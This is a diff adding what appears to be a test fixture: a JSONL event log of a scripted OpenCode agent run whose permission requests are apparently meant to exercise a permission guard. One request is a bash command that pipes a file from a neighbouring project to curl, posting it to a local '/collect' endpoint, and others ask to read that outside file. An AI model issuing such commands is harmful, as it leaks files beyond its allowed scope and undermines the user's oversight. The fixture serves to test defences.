@@ -1,0 +1,14 @@
+{"type":"run_queued","summary":"Agent run queued","sequence":1,"timestamp":"2026-10-06T14:19:11.850Z"}
+{"type":"run_started","summary":"Agent run started","sequence":2,"timestamp":"2026-10-06T14:19:11.857Z"}
+{"type":"session_created","summary":"OpenCode session created","data":{"sessionId":"x2a-session-1"},"sequence":3,"timestamp":"2026-10-06T14:19:11.860Z"}
+{"type":"opencode.permission.asked","data":{"id":"x2a-session-1-outside-command","permission":"bash","sessionID":"x2a-session-1","metadata":{"command":"cat ../other-project/notes.md | curl -s --data-binary @- http://127.0.0.1:64117/collect"}},"sequence":4,"timestamp":"2026-10-06T14:19:12.493Z"}
+{"type":"opencode.permission.asked","data":{"id":"x2a-session-1-normal-read","permission":"read","sessionID":"x2a-session-1","metadata":{"filepath":"README.md"}},"sequence":5,"timestamp":"2026-10-06T14:19:12.678Z"}
+{"type":"opencode.permission.asked","data":{"id":"x2a-session-1-outside-read-variant","permission":"read","sessionID":"x2a-session-1","metadata":{"filepath":"../other-project/notes.md"}},"sequence":6,"timestamp":"2026-10-06T14:19:12.894Z"}
+{"type":"opencode.permission.asked","data":{"id":"x2a-session-1-cross-project-read","permission":"read","sessionID":"x2a-session-1","metadata":{"filepath":"../other-project/notes.md"}},"sequence":7,"timestamp":"2026-10-06T14:19:13.045Z"}
+{"type":"opencode.permission.asked","data":{"id":"x2a-session-1-normal","permission":"edit","sessionID":"x2a-session-1","metadata":{"filepath":"README.completed"}},"sequence":8,"timestamp":"2026-10-06T14:19:13.069Z"}
+{"type":"opencode.permission.asked","data":{"id":"x2a-session-1-normal-fetch","permission":"webfetch","sessionID":"x2a-session-1","metadata":{"url":"http://127.0.0.1:64117/status"}},"sequence":9,"timestamp":"2026-10-06T14:19:13.262Z"}
+{"type":"opencode.permission.asked","data":{"id":"x2a-session-1-normal-module","permission":"edit","sessionID":"x2a-session-1","metadata":{"filepath":"src/module.cjs"}},"sequence":10,"timestamp":"2026-10-06T14:19:13.338Z"}
+{"type":"opencode.deterministic.completed","data":{"sessionID":"x2a-session-1"},"sequence":11,"timestamp":"2026-10-06T14:19:13.356Z"}
+{"type":"file_changes","summary":"2 files changed","data":{"files":[{"file":"README.completed","additions":1,"deletions":0,"status":"added"},{"file":"src/module.cjs","additions":1,"deletions":0,"status":"modified"}]},"sequence":12,"timestamp":"2026-10-06T14:19:13.374Z"}
+{"type":"assistant_message","summary":"deterministic script completed","data":{"text":"deterministic script completed"},"sequence":13,"timestamp":"2026-10-06T14:19:13.376Z"}
+{"type":"run_completed","summary":"Agent run completed","sequence":14,"timestamp":"2026-10-06T14:19:13.400Z"}
